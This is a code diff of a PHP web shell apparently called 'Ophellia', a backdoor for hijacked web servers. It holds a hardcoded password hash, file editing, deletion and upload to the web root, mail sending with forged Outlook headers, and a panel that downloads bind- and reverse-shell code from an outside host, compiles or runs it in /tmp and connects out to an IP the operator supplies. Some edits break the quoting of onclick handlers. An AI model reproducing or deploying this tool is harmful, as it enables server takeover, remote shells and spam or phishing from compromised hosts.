@@ -10,8 +10,8 @@ github.com/elliottophellia/ophellia
  */
 
 // Configuration
-const PASSWORD_HASH = '4f88cdff6be6a175c58836aed671b3aa'; // honeycomebear
 const VERSION = '2.0.0';
+const PASSWORD_HASH = '4f88cdff6be6a175c58836aed671b3aa'; // honeycomebear
 
 // Utility functions
 function hexToString(string $hex): string
@@ -238,7 +238,7 @@ class Elliottophellia
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <meta name="robots" content="noindex, nofollow" />
             <title>Welcome!</title>
-            <link rel="stylesheet" href="style.css">
+            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v2.0.0.css">
             <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
         </head>
         <body>
@@ -261,7 +261,7 @@ class Elliottophellia
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>Ophellia v' . VERSION . '</title>
-            <link rel="stylesheet" href="style.css">
+            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v2.0.0.css">
             <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
             <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
         </head>
@@ -306,13 +306,13 @@ class Elliottophellia
         if (unlink($file)) {
             echo "<dialog id='successModal' class='modal success'>
             <p>File $file Deleted Successfully!</p>
-            <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
           </dialog>";
             echo "<script>document.getElementById('successModal').showModal();</script>";
         } else {
             echo "<dialog id='errorModal' class='modal error'>
             <p>Failed to delete file $file.</p>
-            <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
           </dialog>";
             echo "<script>document.getElementById('errorModal').showModal();</script>";
         }
@@ -323,13 +323,13 @@ class Elliottophellia
         if (rmdir($dir)) {
             echo "<dialog id='successModal' class='modal success'>
             <p>Directory $dir Deleted Successfully!</p>
-            <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
           </dialog>";
             echo "<script>document.getElementById('successModal').showModal();</script>";
         } else {
             echo "<dialog id='errorModal' class='modal error'>
             <p>Failed to delete directory.</p>
-            <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+            <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
           </dialog>";
             echo "<script>document.getElementById('errorModal').showModal();</script>";
         }
@@ -341,14 +341,14 @@ class Elliottophellia
 
         if (file_put_contents($fullPath, $fileContent) !== false) {
             echo "<dialog id='successModal' class='modal success'>
-                <p>File \"$fileName\" Created Successfully!</p>
-                <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+                <p>File '$fileName' Created Successfully!</p>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
               </dialog>";
             echo "<script>document.getElementById('successModal').showModal();</script>";
         } else {
             echo "<dialog id='errorModal' class='modal error'>
-                <p>Failed to create file \"$fileName\".</p>
-                <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?t=" . stringToHex('mkfile') . "&d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+                <p>Failed to create file '$fileName'.</p>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?t=" . stringToHex('mkfile') . "&d=" . stringToHex($this->currentPath) . "';'>Close</button>
               </dialog>";
             echo "<script>document.getElementById('errorModal').showModal();</script>";
         }
@@ -359,14 +359,167 @@ class Elliottophellia
         if (mkdir($this->currentPath . "/" . $dir, 0777, true)) {
             echo "<dialog id='successModal' class='modal success'>
                 <p>Directory $dir Created Successfully!</p>
-                <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
               </dialog>";
             echo "<script>document.getElementById('successModal').showModal();</script>";
         } else {
             echo "<dialog id='errorModal' class='modal error'>
                 <p>Failed to create directory $dir.</p>
-                <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
               </dialog>";
+            echo "<script>document.getElementById('errorModal').showModal();</script>";
+        }
+    }
+
+    private function exit(): void
+    {
+        session_destroy();
+        echo '<script>window.location.href = "' . $this->selfFile . '";</script>';
+    }
+
+    private function downloadFile(string $file): void
+    {
+        if (file_exists($file)) {
+            header('Content-Description: File Transfer');
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+            header('Expires: 0');
+            header('Cache-Control: must-revalidate');
+            header('Pragma: public');
+            header('Content-Length: ' . filesize($file));
+            readfile($file);
+            exit;
+        }
+    }
+
+    private function executeNetworkTool(string $type, string $ip, string $port, string $pty, string $rby, string $bcc, string $bcp, string $bpc, string $bpp): void
+    {
+        switch ($type) {
+            case 'cb':
+                safeFileWrite('/tmp/cb.c', $bpc);
+                getFunctionalCmd('gcc -o /tmp/cb /tmp/cb.c');
+                getFunctionalCmd('/tmp/cb ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep cb') . "</pre>";
+                break;
+            case 'pb':
+                safeFileWrite('/tmp/pb.pl', $bpp);
+                getFunctionalCmd('perl /tmp/pb.pl ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep pb') . "</pre>";
+                break;
+            case 'cbc':
+                safeFileWrite('/tmp/cbc.c', $bcc);
+                getFunctionalCmd('gcc -o /tmp/cbc /tmp/cbc.c');
+                getFunctionalCmd('/tmp/cbc ' . $ip . ' ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep cbc') . "</pre>";
+                break;
+            case 'pbc':
+                safeFileWrite('/tmp/pbc.pl', $bcp);
+                getFunctionalCmd('perl /tmp/pbc.pl ' . $ip . ' ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep pbc') . "</pre>";
+                break;
+            case 'rbb':
+                safeFileWrite('/tmp/rbb.rb', $rby);
+                getFunctionalCmd('ruby /tmp/rbb.rb ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep rbb') . "</pre>";
+                break;
+            case 'rbbc':
+                safeFileWrite('/tmp/rbbc.rb', $rby);
+                getFunctionalCmd('ruby /tmp/rbbc.rb ' . $port . ' ' . $ip . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep rbbc') . "</pre>";
+                break;
+            case 'pyb':
+                safeFileWrite('/tmp/pyb.py', $pty);
+                getFunctionalCmd('python /tmp/pyb.py ' . $port . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep pyb') . "</pre>";
+                break;
+            case 'pybc':
+                safeFileWrite('/tmp/pybc.py', $pty);
+                getFunctionalCmd('python /tmp/pybc.py ' . $port . ' ' . $ip . ' &');
+                echo "<pre>" . getFunctionalCmd('ps aux | grep pybc') . "</pre>";
+                break;
+        }
+    }
+
+    private function checkMailServerAccess(): bool
+    {
+        $testTo = 'test@example.com';
+        $testSubject = 'Test Mail Server Access';
+        $testMessage = 'This is a test message to check mail server access.';
+        $testHeaders = 'From: test@' . $_SERVER['SERVER_NAME'] . "\r\n" . 'X-Mailer: PHP/' . phpversion();
+
+        // Suppress warnings and notices during the mail() function call
+        $errorReporting = error_reporting();
+        error_reporting(E_ERROR);
+
+        $result = @mail($testTo, $testSubject, $testMessage, $testHeaders);
+
+        // Restore original error reporting level
+        error_reporting($errorReporting);
+
+        return $result;
+    }
+
+    private function sendSimpleMail(): void
+    {
+        $to = $this->extractEmail($this->post['to']);
+        $subject = $this->post['subject'];
+        $message = $this->post['message'];
+        $from = $this->extractEmail($this->post['from']);
+        $fromName = $this->extractName($this->post['from']);
+
+        $headers = "From: $fromName <$from>\r\n";
+        $headers .= "Reply-To: $from\r\n";
+        $headers .= "X-Priority: 1\r\n";
+        $headers .= "X-MSmail-Priority: High\r\n";
+        $headers .= "X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n";
+        $headers .= "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n";
+
+        if (mail($to, $subject, $message, $headers)) {
+            echo "<dialog id='successModal' class='modal success'>
+                    <p>Mail Sent Successfully!</p>
+                    <button onclick='this.closest('dialog').close()'>Close</button>
+                  </dialog>";
+            echo "<script>document.getElementById('successModal').showModal();</script>";
+        } else {
+            echo "<dialog id='errorModal' class='modal error'>
+                    <p>Failed to send mail.</p>
+                    <button onclick='this.closest('dialog').close()'>Close</button>
+                  </dialog>";
+            echo "<script>document.getElementById('errorModal').showModal();</script>";
+        }
+    }
+
+    private function extractEmail(string $input): string
+    {
+        if (strpos($input, '<') !== false && strpos($input, '>') !== false) {
+            preg_match('/<(.+?)>/', $input, $matches);
+            return $matches[1] ?? $input;
+        }
+        return trim($input);
+    }
+
+    private function extractName(string $input): string
+    {
+        preg_match('/(.+?)\s*</', $input, $matches);
+        return trim($matches[1] ?? '');
+    }
+
+    private function handleFileUpload(): void
+    {
+        $uploadPath = $this->post['uploadtype'] == 1 ? $this->currentPath : $_SERVER['DOCUMENT_ROOT'];
+        $tmp = $this->files['upload']['tmp_name'];
+        $up = basename($this->files['upload']['name']);
+        if (move_uploaded_file($tmp, $uploadPath . "/" . $up)) {
+            echo "<dialog id='successModal' class='modal success'>
+            <p>File Uploaded successfully!</p>
+            <button onclick='this.closest('dialog').close()'>Close</button>
+          </dialog>";
+            echo "<script>document.getElementById('successModal').showModal();</script>";
+        } else {
+            echo "<dialog id='errorModal' class='modal error'>
+            <p>Failed to upload file.</p>
+            <button onclick='this.closest('dialog').close()'>Close</button>
+          </dialog>";
             echo "<script>document.getElementById('errorModal').showModal();</script>";
         }
     }
@@ -377,14 +530,14 @@ class Elliottophellia
         $ps = preg_split("/(\\\|\/)/", $this->currentPath);
         foreach ($ps as $k => $v) {
             if ($k == 0 && $v == "") {
-                echo "<a href=\"?d=2f\">~</a>/";
+                echo "<a href='?d=2f'>~</a>/";
                 continue;
             }
             if ($v == "") {
                 continue;
             }
 
-            echo "<a href=\"?d=";
+            echo "<a href='?d=";
             for ($i = 0; $i <= $k; $i++) {
                 echo stringToHex($ps[$i]);
                 if ($i != $k) {
@@ -392,7 +545,7 @@ class Elliottophellia
                 }
 
             }
-            echo "\">{$v}</a>/";
+            echo "'>{$v}</a>/";
         }
         echo '</p>';
     }
@@ -404,12 +557,6 @@ class Elliottophellia
         [ <a href="' . $this->selfFile . '?t=' . stringToHex('mkdir') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-folder-plus"></i> New Folder</a> ]
         [ <a href="' . $this->selfFile . '?t=' . stringToHex('command') . '&d=' . stringToHex($this->currentPath) . '"><i class="fas fa-terminal"></i> Command</a> ]
         </p>';
-    }
-
-    private function exit(): void
-    {
-        session_destroy();
-        echo '<script>window.location.href = "' . $this->selfFile . '";</script>';
     }
 
     private function showFileManager(): void
@@ -518,21 +665,6 @@ class Elliottophellia
         </section>';
     }
 
-    private function downloadFile(string $file): void
-    {
-        if (file_exists($file)) {
-            header('Content-Description: File Transfer');
-            header('Content-Type: application/octet-stream');
-            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
-            header('Expires: 0');
-            header('Cache-Control: must-revalidate');
-            header('Pragma: public');
-            header('Content-Length: ' . filesize($file));
-            readfile($file);
-            exit;
-        }
-    }
-
     private function showFileEditTools(): void
     {
         $file = hexToString($this->get['fedit']);
@@ -558,13 +690,13 @@ class Elliottophellia
             if (file_put_contents($file, $this->post['content']) !== false) {
                 echo "<dialog id='successModal' class='modal success'>
                     <p>File Edited Successfully!</p>
-                    <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+                    <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
                   </dialog>";
                 echo "<script>document.getElementById('successModal').showModal();</script>";
             } else {
                 echo "<dialog id='errorModal' class='modal error'>
                     <p>Failed to edit file.</p>
-                    <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+                    <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
                   </dialog>";
                 echo "<script>document.getElementById('errorModal').showModal();</script>";
             }
@@ -591,14 +723,14 @@ class Elliottophellia
                 rename($this->post['oldname'], $this->post['newname']);
                 echo "<dialog id='successModal' class='modal success'>
                 <p>File Renamed Successfully!</p>
-                <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
               </dialog>";
                 echo "<script>document.getElementById('successModal').showModal();</script>";
 
             } else {
                 echo "<dialog id='errorModal' class='modal error'>
                 <p>Failed to rename file.</p>
-                <button onclick='this.closest(\"dialog\").close(); window.location.href = \"" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "\";'>Close</button>
+                <button onclick='this.closest('dialog').close(); window.location.href = '" . $this->selfFile . "?d=" . stringToHex($this->currentPath) . "';'>Close</button>
               </dialog>";
                 echo "<script>document.getElementById('errorModal').showModal();</script>";
             }
@@ -663,58 +795,44 @@ class Elliottophellia
         $bpc = file_get_contents('https://rei.my.id/bind_shell/c.txt');
         $bpp = file_get_contents('https://rei.my.id/bind_shell/perl.txt');
 
-        echo '<section class="tool-section"><h2>Network Tools</h2><h3>Bind Shell</h3><form method="post" action="">IP: <input type="text" name="ip" value="' . gethostbyname($_SERVER['HTTP_HOST']) . '" readonly> Port: <input type="text" name="port" value="31337"> Type: <select name="type"><option value="cb">C</option><option value="pb">Perl</option><option value="rbb">Ruby</option><option value="pyb">Python</option></select> <button type="submit">Execute</button></form><br/><h3>Reverse Shell</h3><form method="post" action="">IP: <input type="text" name="ip" value=""> Port: <input type="text" name="port" value="31337"> Type: <select name="type"><option value="cbc">C</option><option value="pbc">Perl</option><option value="rbbc">Ruby</option><option value="pybc">Python</option></select> <button type="submit">Execute</button></form></section>';
+        echo '
+        <section class="tool-section">
+            <h2>Network Tools</h2>
+            <h3>Bind Shell</h3>
+            <form method="post" action="">
+                <p> IP : </p>
+                <input type="text" name="ip" value="' . gethostbyname($_SERVER['HTTP_HOST']) . '" readonly>
+                <p> Port : </p>
+                <input type="text" name="port" value="31337">
+                <p> Type : </p>
+                <select name="type">
+                            <option value="cb">C</option>
+                            <option value="pb">Perl</option>
+                            <option value="rbb">Ruby</option>
+                            <option value="pyb">Python</option>
+                        </select>
+                <button type="submit">Execute</button>
+            </form>
+            <br/>
+            <h3>Reverse Shell</h3>
+            <form method="post" action="">
+                <p> IP : </p>
+                <input type="text" name="ip" value="">
+                <p> Port : </p>
+                <input type="text" name="port" value="31337">
+                <p> Type : </p>
+                <select name="type">
+                    <option value="cbc">C</option>
+                    <option value="pbc">Perl</option>
+                    <option value="rbbc">Ruby</option>
+                    <option value="pybc">Python</option>
+                    </select>
+                <button type="submit">Execute</button>
+            </form>
+        </section>';
 
         if (isset($this->post['type'])) {
             $this->executeNetworkTool($this->post['type'], $this->post['ip'], $this->post['port'], $pty, $rby, $bcc, $bcp, $bpc, $bpp);
-        }
-    }
-
-    private function executeNetworkTool(string $type, string $ip, string $port, string $pty, string $rby, string $bcc, string $bcp, string $bpc, string $bpp): void
-    {
-        switch ($type) {
-            case 'cb':
-                safeFileWrite('/tmp/cb.c', $bpc);
-                getFunctionalCmd('gcc -o /tmp/cb /tmp/cb.c');
-                getFunctionalCmd('/tmp/cb ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep cb') . "</pre>";
-                break;
-            case 'pb':
-                safeFileWrite('/tmp/pb.pl', $bpp);
-                getFunctionalCmd('perl /tmp/pb.pl ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep pb') . "</pre>";
-                break;
-            case 'cbc':
-                safeFileWrite('/tmp/cbc.c', $bcc);
-                getFunctionalCmd('gcc -o /tmp/cbc /tmp/cbc.c');
-                getFunctionalCmd('/tmp/cbc ' . $ip . ' ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep cbc') . "</pre>";
-                break;
-            case 'pbc':
-                safeFileWrite('/tmp/pbc.pl', $bcp);
-                getFunctionalCmd('perl /tmp/pbc.pl ' . $ip . ' ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep pbc') . "</pre>";
-                break;
-            case 'rbb':
-                safeFileWrite('/tmp/rbb.rb', $rby);
-                getFunctionalCmd('ruby /tmp/rbb.rb ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep rbb') . "</pre>";
-                break;
-            case 'rbbc':
-                safeFileWrite('/tmp/rbbc.rb', $rby);
-                getFunctionalCmd('ruby /tmp/rbbc.rb ' . $port . ' ' . $ip . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep rbbc') . "</pre>";
-                break;
-            case 'pyb':
-                safeFileWrite('/tmp/pyb.py', $pty);
-                getFunctionalCmd('python /tmp/pyb.py ' . $port . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep pyb') . "</pre>";
-                break;
-            case 'pybc':
-                safeFileWrite('/tmp/pybc.py', $pty);
-                getFunctionalCmd('python /tmp/pybc.py ' . $port . ' ' . $ip . ' &');
-                echo "<pre>" . getFunctionalCmd('ps aux | grep pybc') . "</pre>";
-                break;
         }
     }
 
@@ -758,70 +876,6 @@ class Elliottophellia
         echo '</section>';
     }
 
-    private function checkMailServerAccess(): bool
-    {
-        $testTo = 'test@example.com';
-        $testSubject = 'Test Mail Server Access';
-        $testMessage = 'This is a test message to check mail server access.';
-        $testHeaders = 'From: test@' . $_SERVER['SERVER_NAME'] . "\r\n" . 'X-Mailer: PHP/' . phpversion();
-
-        // Suppress warnings and notices during the mail() function call
-        $errorReporting = error_reporting();
-        error_reporting(E_ERROR);
-
-        $result = @mail($testTo, $testSubject, $testMessage, $testHeaders);
-
-        // Restore original error reporting level
-        error_reporting($errorReporting);
-
-        return $result;
-    }
-
-    private function sendSimpleMail(): void
-    {
-        $to = $this->extractEmail($this->post['to']);
-        $subject = $this->post['subject'];
-        $message = $this->post['message'];
-        $from = $this->extractEmail($this->post['from']);
-        $fromName = $this->extractName($this->post['from']);
-
-        $headers = "From: $fromName <$from>\r\n";
-        $headers .= "Reply-To: $from\r\n";
-        $headers .= "X-Priority: 1\r\n";
-        $headers .= "X-MSmail-Priority: High\r\n";
-        $headers .= "X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n";
-        $headers .= "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n";
-
-        if (mail($to, $subject, $message, $headers)) {
-            echo "<dialog id='successModal' class='modal success'>
-                    <p>Mail Sent Successfully!</p>
-                    <button onclick='this.closest(\"dialog\").close()'>Close</button>
-                  </dialog>";
-            echo "<script>document.getElementById('successModal').showModal();</script>";
-        } else {
-            echo "<dialog id='errorModal' class='modal error'>
-                    <p>Failed to send mail.</p>
-                    <button onclick='this.closest(\"dialog\").close()'>Close</button>
-                  </dialog>";
-            echo "<script>document.getElementById('errorModal').showModal();</script>";
-        }
-    }
-
-    private function extractEmail(string $input): string
-    {
-        if (strpos($input, '<') !== false && strpos($input, '>') !== false) {
-            preg_match('/<(.+?)>/', $input, $matches);
-            return $matches[1] ?? $input;
-        }
-        return trim($input);
-    }
-
-    private function extractName(string $input): string
-    {
-        preg_match('/(.+?)\s*</', $input, $matches);
-        return trim($matches[1] ?? '');
-    }
-
     private function showUploadTools(): void
     {
         echo "<section class='tool-section'>
@@ -840,7 +894,7 @@ class Elliottophellia
                     </div>
                 </div>
                 <div class='file-input-wrapper'>
-                    <input type='file' name='upload' onchange='this.form.querySelector(\"button[type=submit]\").click()'>
+                    <input type='file' name='upload' onchange='this.form.querySelector('button[type=submit]').click()'>
                 </div>
                 <button type='submit' name='upload' style='display:none;'>Upload</button>
             </form>
@@ -848,26 +902,6 @@ class Elliottophellia
 
         if (isset($this->post['upload'])) {
             $this->handleFileUpload();
-        }
-    }
-
-    private function handleFileUpload(): void
-    {
-        $uploadPath = $this->post['uploadtype'] == 1 ? $this->currentPath : $_SERVER['DOCUMENT_ROOT'];
-        $tmp = $this->files['upload']['tmp_name'];
-        $up = basename($this->files['upload']['name']);
-        if (move_uploaded_file($tmp, $uploadPath . "/" . $up)) {
-            echo "<dialog id='successModal' class='modal success'>
-            <p>File Uploaded successfully!</p>
-            <button onclick='this.closest(\"dialog\").close()'>Close</button>
-          </dialog>";
-            echo "<script>document.getElementById('successModal').showModal();</script>";
-        } else {
-            echo "<dialog id='errorModal' class='modal error'>
-            <p>Failed to upload file.</p>
-            <button onclick='this.closest(\"dialog\").close()'>Close</button>
-          </dialog>";
-            echo "<script>document.getElementById('errorModal').showModal();</script>";
         }
     }
 
